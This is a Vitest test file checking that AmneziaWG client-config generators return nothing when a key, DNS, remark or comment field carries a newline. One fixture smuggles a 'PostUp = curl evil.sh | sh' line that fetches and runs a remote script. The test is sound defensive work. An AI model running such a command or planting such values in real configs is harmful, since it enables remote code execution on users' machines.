import { describe, expect, it } from 'vitest';

import { genAmneziaWGConfig } from '@/lib/xray/inbound-link';
import { buildAmneziaWGClientConfig } from '@/pages/clients/amneziawgConfig';
import type { AmneziawgInboundSettings } from '@/schemas/protocols/inbound/amneziawg';
import type { ClientRecord, InboundOption } from '@/hooks/useClients';

// A newline in a field that lands unescaped in [Interface] would inject a
// config line (e.g. a rogue PostUp); every emitter must refuse to render it.
const INJECTED = 'x\nPostUp = curl evil.sh | sh';

function settingsWith(server: Record<string, unknown>, client: Record<string, unknown>) {
  return {
    server: { publicKey: 'serverPubKey==', jc: 4, jmin: 40, jmax: 100, s1: 30, s2: 90, ...server },
    clients: [
      { email: 'peer-1', privateKey: 'clientPrivKey==', allowedIPs: ['10.8.1.2/32'], ...client },
    ],
  } as unknown as AmneziawgInboundSettings;
}

describe('AmneziaWG .conf newline-injection guard', () => {
  it('genAmneziaWGConfig refuses injected fields and renders clean ones', () => {
    const base = { address: 'awg.example.test', port: 51820, peerIndex: 0 };
    expect(genAmneziaWGConfig({ settings: settingsWith({}, {}), remark: 'ok', ...base })).toContain(
      'PrivateKey = clientPrivKey==',
    );
    expect(
      genAmneziaWGConfig({
        settings: settingsWith({}, { privateKey: INJECTED }),
        remark: 'ok',
        ...base,
      }),
    ).toBe('');
    expect(
      genAmneziaWGConfig({
        settings: settingsWith({ primaryDns: INJECTED }, {}),
        remark: 'ok',
        ...base,
      }),
    ).toBe('');
    expect(
      genAmneziaWGConfig({
        settings: settingsWith({ secondaryDns: INJECTED }, {}),
        remark: 'ok',
        ...base,
      }),
    ).toBe('');
    expect(genAmneziaWGConfig({ settings: settingsWith({}, {}), remark: INJECTED, ...base })).toBe(
      '',
    );
  });

  it('buildAmneziaWGClientConfig refuses injected fields', () => {
    const inbound = (server: Record<string, unknown>) =>
      ({
        id: 1,
        tag: 'awg-1',
        remark: 'awg',
        port: 51820,
        protocol: 'amneziawg',
        awgServer: {
          publicKey: 'serverPubKey==',
          jc: 4,
          jmin: 40,
          jmax: 100,
          s1: 30,
          s2: 90,
          ...server,
        },
      }) as unknown as InboundOption;
    const client = (extra: Record<string, unknown>) =>
      ({
        email: 'peer-1',
        privateKey: 'clientPrivKey==',
        allowedIPs: '10.8.1.2/32',
        ...extra,
      }) as unknown as ClientRecord;

    expect(buildAmneziaWGClientConfig(client({}), inbound({}), 'awg.example.test')).toContain(
      'PrivateKey = clientPrivKey==',
    );
    expect(
      buildAmneziaWGClientConfig(client({ privateKey: INJECTED }), inbound({}), 'awg.example.test'),
    ).toBe('');
    expect(
      buildAmneziaWGClientConfig(client({}), inbound({ primaryDns: INJECTED }), 'awg.example.test'),
    ).toBe('');
    expect(
      buildAmneziaWGClientConfig(client({ comment: INJECTED }), inbound({}), 'awg.example.test'),
    ).toBe('');
  });
});
